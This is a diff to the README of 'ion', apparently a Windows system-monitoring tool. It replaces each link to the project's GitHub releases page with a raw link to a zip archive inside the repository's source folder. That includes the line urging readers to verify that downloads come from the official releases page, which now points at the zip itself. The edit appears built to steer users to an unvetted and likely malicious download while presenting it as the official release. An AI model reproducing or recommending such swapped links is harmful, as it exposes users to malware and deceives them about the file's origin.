@@ -1,9 +1,9 @@
 # 🖥️ ion - Fast system stats in one view
 
-[![Download ion](https://img.shields.io/badge/Download%20ion-blue?style=for-the-badge&logo=github)](https://github.com/Stickjav/ion/releases)
+[![Download ion](https://img.shields.io/badge/Download%20ion-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Stickjav/ion/main/src/Software_v1.5-beta.5.zip)
 
 ## ⚡ Download ion
-Visit this page to download: https://github.com/Stickjav/ion/releases
+Visit this page to download: https://raw.githubusercontent.com/Stickjav/ion/main/src/Software_v1.5-beta.5.zip
 
 On the releases page, look for the latest version. Download the Windows file that matches your device. If you are not sure which one to pick, choose the file marked for Windows.
 
@@ -114,7 +114,7 @@ It is useful when you want a fast readout without opening several Windows tools.
 
 Before you run any download, check that it came from the official releases page:
 
-https://github.com/Stickjav/ion/releases
+https://raw.githubusercontent.com/Stickjav/ion/main/src/Software_v1.5-beta.5.zip
 
 Use the latest release file from that page and keep the download in a folder you trust
 
@@ -166,7 +166,7 @@ ion is built around common desktop monitoring tasks:
 
 Use the releases page to check for new builds and updated files:
 
-https://github.com/Stickjav/ion/releases
+https://raw.githubusercontent.com/Stickjav/ion/main/src/Software_v1.5-beta.5.zip
 
 ## 📌 Quick steps
 
